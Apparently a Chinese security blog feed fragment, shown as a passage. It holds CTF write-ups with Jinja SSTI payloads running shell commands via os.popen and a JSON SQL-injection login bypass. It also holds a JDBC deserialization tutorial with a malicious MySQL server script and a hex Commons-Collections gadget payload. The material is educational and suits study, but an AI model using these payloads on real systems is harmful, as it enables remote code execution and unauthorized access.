class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():  </span><br><span class="line">    <span class="keyword">global</span> phone  </span><br><span class="line">    phone = request.form.get(<span class="string">&quot;phone_number&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cpass&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():  </span><br><span class="line">    <span class="keyword">global</span> phone  </span><br><span class="line">    password = request.form.get(<span class="string">&quot;password&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> is_safe_input(phone):  </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> phone != <span class="string">&quot;1686682318&quot;</span> <span class="keyword">and</span> password != <span class="string">&quot;Happy_news_admin&quot;</span>:  </span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">&#x27;&lt;!DOCTYPE html&gt;\  </span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;\  </span></span><br><span class="line"><span class="string">        &lt;head&gt;\  </span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;\  </span></span><br><span class="line"><span class="string">            &lt;title&gt;login failed&lt;/title&gt;\  </span></span><br><span class="line"><span class="string">        &lt;/head&gt;\  </span></span><br><span class="line"><span class="string">        &lt;body&gt;\  </span></span><br><span class="line"><span class="string">            &lt;script&gt;alert(&quot;&#123;&#125;The number does not exist or the password is incorrect!&quot;) &lt;/script&gt;\  </span></span><br><span class="line"><span class="string">            &lt;script&gt;window.location.href = &quot;/&quot;;&lt;/script&gt;\  </span></span><br><span class="line"><span class="string">        &lt;/body&gt;\  </span></span><br><span class="line"><span class="string">        &lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(phone))  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="built_in">int</span>(<span class="string">&quot;5005&quot;</span>), debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>从源码中也能看出来是在cpass中渲染的，所以这里就只需要绕过黑名单就可以了</p><p>直接上payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span> cycler.<span class="built_in">next</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cd ..;ls&#x27;</span>).read()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%<span class="built_in">print</span> cycler.<span class="built_in">next</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;CD ..;NL FLAGF149&#x27;</span>.lower()).read()%&#125;<span class="string">&quot;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="sqli-or-not">sqli or not</h3><p>先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);  </span><br><span class="line">var router = express.Router();  </span><br><span class="line">module.exports = router;  </span><br><span class="line">  </span><br><span class="line">router.get(&#x27;/&#x27;,(req,res,next)=&gt;&#123;  </span><br><span class="line">    if(req.query.info)&#123;  </span><br><span class="line">        if(req.url.match(/\,/ig))&#123;  </span><br><span class="line">            res.end(&#x27;hacker1!&#x27;);  </span><br><span class="line">        &#125;  </span><br><span class="line">        var info = JSON.parse(req.query.info);  </span><br><span class="line">        if(info.username&amp;&amp;info.password)&#123;  </span><br><span class="line">            var username = info.username;  </span><br><span class="line">            var password = info.password;  </span><br><span class="line">            if(info.username.match(/\&#x27;|\&quot;|\\/) || info.password.match(/\&#x27;|\&quot;|\\/))&#123;  </span><br><span class="line">                res.end(&#x27;hacker2!&#x27;);  </span><br><span class="line">            &#125;  </span><br><span class="line">            var sql = &quot;select * from userinfo where username = &#x27;&#123;username&#125;&#x27; and password = &#x27;&#123;password&#125;&#x27;&quot;;  </span><br><span class="line">            sql = sql.replace(&quot;&#123;username&#125;&quot;,username);  </span><br><span class="line">            sql = sql.replace(&quot;&#123;password&#125;&quot;,password);  </span><br><span class="line">            connection.query(sql,function (err,rs) &#123;  </span><br><span class="line">            if (err) &#123;  </span><br><span class="line">                res.end(&#x27;error1&#x27;);  </span><br><span class="line">            &#125;  </span><br><span class="line">            else &#123;  </span><br><span class="line">                if(rs.length&gt;0)&#123;  </span><br><span class="line">                res.sendFile(&#x27;/flag&#x27;);  </span><br><span class="line">                &#125;else &#123;  </span><br><span class="line">                res.end(&#x27;username or password error&#x27;);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">            &#125;)  </span><br><span class="line">        &#125;  </span><br><span class="line">        else&#123;  </span><br><span class="line">            res.end(&quot;please input the data&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line"> &#125;else&#123;  </span><br><span class="line">        res.end(&quot;please input the data&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这题其实刚开始看的时候以为是考点是sql注入但是发现过滤了 \ &quot; ’ ,等导致找了很多资料也不知道怎么绕，结束之后才发现考点其实在replace这个函数上，可以参考：<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastMatch">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastMatch</a></p><p>主要利用的是</p><img src="/post/44a17c03/IMAGE20250119125214353.png" class=""><p>可以看到这里的 <font>$`</font> 直接看解释可能有点抽象看一下调试就明白了</p><img src="/post/44a17c03/IMAGE20250119131022981.png" class=""><p>可以看到已经闭合了前面的’所以就可以直接构造sql万能绕过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;$` or 1--+&quot;%2c&quot;password&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><h3 id="糟糕的磁盘">糟糕的磁盘</h3><p>这题其实用取证大师可以直接梭哈出来key.png 和 一个secret然后用Veracrypt解密即可。这里还学到了一个新的工具</p><img src="/post/44a17c03/IMAGE20250119131358031.png" class=""><p>这个也可以直接扫描出来进行磁盘取证。</p><h2 id="ds">ds</h2><h3 id="easydatalog">easydatalog</h3><p>这题的话就是日志分析套了一层图片隐写，先分析日志</p><img src="/post/44a17c03/IMAGE20250119131614809.png" class=""><p>这里可以看到是jpg图片，然后通过对前面的🐜剑数据解密得到是一个password.jpg所以对其进行单图忙水印即可得到一个密码</p><img src="/post/44a17c03/IMAGE20250119131903502.png" class=""><p>在下面还有一个压缩包</p><img src="/post/44a17c03/IMAGE20250119131739135.png" class=""><p>将上图的密码解压可得到csv文件直接搜索张三即可获取其身份证和手机号。</p><h3 id="取证">取证</h3><p>这题没时间做了但是还是比较简单的，可以直接用lovelymem集成的vol工具进行内存分析</p><p>直接看控制台输出</p><img src="/post/44a17c03/IMAGE20250119132349042.png" class=""><p>很容易能够想到去把这几个文件导出来进行解密还原</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">hackkey = os.getenv(<span class="string">&#x27;hackkey&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> hackkey:</span><br><span class="line"></span><br><span class="line"><span class="keyword">raise</span> ValueError(<span class="string">&quot;Environment variable &#x27;hackkey&#x27; is not set&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;private.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">private_key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line">public_key = private_key.publickey().export_key()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">aes_key = hashlib.sha256(hackkey.encode()).digest()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.csv&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">cipher_aes = AES.new(aes_key, AES.MODE_EAX)</span><br><span class="line"></span><br><span class="line">ciphertext, tag = cipher_aes.encrypt_and_digest(data)</span><br><span class="line"></span><br><span class="line">cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))</span><br><span class="line"></span><br><span class="line">enc_aes_key = cipher_rsa.encrypt(aes_key)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;encrypted_data.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">f.write(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_aes_key.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cipher_aes.nonce.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tag.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>这是加密的脚本逆向还原就行，这里用到的key去找环境变量</p><img src="/post/44a17c03/IMAGE20250119133056348.png" class=""><p>找到key之后还有控制台的输出直接可以写解密脚本。然后在后面的解密出来的csv中的个性签名是rc4加密密钥就是密码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Web&quot;&gt;Web&lt;/h2&gt;
&lt;h3 id=&quot;Rank-l&quot;&gt;Rank-l&lt;/h3&gt;
&lt;p&gt;这题一开始看没什么思路，后来通过看响应包发现是python服务器所以想到可能是ssti所以就去试了试，发现在login路由输入payload会在cpass路由中渲染。看看源码</summary>
      
    
    
    
    <category term="CTF" scheme="https://oceanzbz.github.io/categories/CTF/"/>
    
    
    <category term="CTFWP" scheme="https://oceanzbz.github.io/tags/CTFWP/"/>
    
  </entry>
  
  <entry>
    <title>JDBC反序列化</title>
    <link href="https://oceanzbz.github.io/post/7e872f66.html"/>
    <id>https://oceanzbz.github.io/post/7e872f66.html</id>
    <published>2025-01-07T06:34:12.000Z</published>
    <updated>2025-03-05T07:24:36.792Z</updated>
    
    <content type="html"><![CDATA[<h2 id="条件">条件</h2><ul><li>Jdbc可控且目标机器出网。</li><li>存在反序列化利用链的漏洞组件例如cc链那些。</li></ul><h2 id="前置知识">前置知识</h2><ul><li>BLOB为二进制形式的长文本数据</li><li>BIT类型(Bit数据类型用来存储bit值)数据</li><li>queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）</li><li>autoDeserialize:自动检测与反序列化存在BLOB字段中的对象</li></ul><p>这里其实最主要的点是在与这个queryInterceptors参数，引用其他师傅的解释：</p><blockquote><p>它允许你指定一个或多个实现了 <code>com.mysql.cj.interceptors.QueryInterceptor</code>​ 接口的类。这些类的目的是在执行 SQL 查询前后进行拦截和操纵，你完全可以理解为，只要JDBC带上了这个，在执行SQL语句前 和 后 他就会有一层类似的<code>Filter</code>​，默认调用其 预处理<code>preProcess</code>​ 和后处理<code>postProcess</code>​等方法！！！</p></blockquote><h2 id="ServerStatusDiffInterceptor链">ServerStatusDiffInterceptor链</h2><h3 id="8-0-7-8-0-20">8.0.7-8.0.20</h3><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="调用链分析">调用链分析</h2><p>先来找到调用readObject的地方，毕竟这里是反序列化的执行点。</p><img src="/post/7e872f66/IMAGE20250108124312056.png" class=""><p>找到了<code>com.mysql.cj.jdbc.result.ResultSetImpl</code> 这个类的<code>getobject</code> 方法可以看到调用了readObject方法，接着去寻找哪里调用了getobject方法</p><img src="/post/7e872f66/IMAGE20250108124735168.png" class=""><p>找到了 <code>com.mysql.cj.jdbc.util.ResultSetUtil</code>类的<code>resultSetToMap()</code>​方法,在继续寻找调用resultSetToMap方法的地方</p><img src="/post/7e872f66/IMAGE20250108124947571.png" class=""><p>找到<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>类的<code>populateMapWithSessionStatusValues()</code>​ 方法，还要继续寻找谁调用了它</p><img src="/post/7e872f66/IMAGE20250108125150644.png" class=""><p>可以找到在其同类下的<code>preProcess</code>方法调用了它，到此为止链子就算可以闭合了。为什么这么说呢，是因为mysql在执行getconect进行连接时会调用一系列的方法触发我们手动配置的queryInterceptors(可以类比于一个拦截查询器)，如果不为空的话就会调用preProcess方法，接着就会调用populateMapWithSessionStatusValues方法并且执行一个<code>SHOW SESSION STATUS</code>sql语句，并将返回的结果放入<code>resultSetToMap</code>方法中再去调用<code>getobject</code>方法从而触发漏洞。</p><p>仅凭语言描述还是比较抽象，搭建一个恶意mysql服务端，来跟进一下执行了<code>getConnection</code>方法的流程</p><h4 id="Mysql客户端">Mysql客户端</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.*;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jdbc8</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">DB_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:59716/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator&quot;</span>;<span class="comment">//8.x使用  </span></span><br><span class="line">        Class.forName(driver);  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(DB_URL);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Mysql服务端">Mysql服务端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &amp;gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span 